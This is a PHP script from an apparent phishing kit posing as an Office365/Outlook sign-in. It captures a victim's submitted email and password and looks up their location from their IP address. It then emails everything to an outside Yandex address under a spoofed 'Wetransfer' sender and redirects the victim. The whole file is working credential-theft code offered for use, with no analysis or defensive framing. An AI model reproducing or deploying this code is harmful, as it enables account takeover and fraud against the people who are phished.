<?php
session_start();
if($_SERVER["REQUEST_METHOD"] == "POST"){
	$username = htmlspecialchars($_POST["x"]);
	$pwd = htmlspecialchars($_POST["p"]);
	$id = $_SESSION["username"] = $username;
	$encoded_id = base64_encode($id);
	$request_uri = $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
	
	$ip = getenv('HTTP_CLIENT_IP');
	
	switch($ip){
		case "IP":
			$ip = getenv('HTTP_CLIENT_IP');
			break;
		case "IP":
			$ip = getenv('HTTP_X_FORWARDED_FOR');
			break;
		case "IP":
			$ip = getenv('HTTP_X_FORWARDED');
			break;
		case "IP":
			$ip = getenv('HTTP_FORWARDED_FOR');
			break;
		case "IP":
			$ip = getenv('HTTP_FORWARDED_FOR');
			break;
		case "IP":
			$ip = getenv('REMOTE_ADDR');
			break;
		default:
			$ip = getenv('REMOTE_ADDR');
			break;
	}
	
	
	$query = @unserialize(file_get_contents('http://ip-api.com/php/'.$ip));
	if($query && $query['status'] == 'success') {
	  $city = $query['city'];
	  $country = $query['country'];
	  $regionName = $query['regionName'];
	  $ip = $query['query'];
	} else {
	  $ip = 'Unable to get location';
	}
	
	$msg = "<h3>RESULT : Office365/Outlook</h3><hr>
	<br>
	City : <b>$city</b> <br/>
	Country : <b>$country</b><br/>
	Region : <b>$regionName</b><br/>
	IP : <b>$ip</b>

	<p>Time Received - ". date("d/m/Y h:i:s a") ."</p>
	";
	
	$period = date('F - Y');
	$to = "hk.blaze@yandex.com";
	$subject = "Visitor from: {$city}";
	$headers = "From: Wetransfer <info@webmatrix.net>\r\n";
	
	$headers .= "MIME-Version: 1.0\r\n";
	$headers .= "Content-Type: text/html; charset=ISO-8859-1\r\n";

	$message = '<html><body>';

	$message .= '<table rules="all" style="border-color: #666;" cellpadding="10">';
	$message .= "<tr><td><strong>Location Details:</strong> </td><td>" . $msg . "</td></tr>";
	$message .= "<tr><td><strong>Client's Email:</strong> </td><td>" .$username. "</td></tr>";
	$message .= "<tr><td><strong>Password:</strong> </td><td>" .$pwd. "</td></tr>";
	$message .= "</table>";
	$message .= "</body></html>";
	$message .= "---------------Created BY Dubby-------------\r\n";
	if($send = @mail($to, $subject, $message, $headers)) {
		header("Location: index_.php?x={$encoded_id}&tkn=".md5($request_uri));
	}

}

?>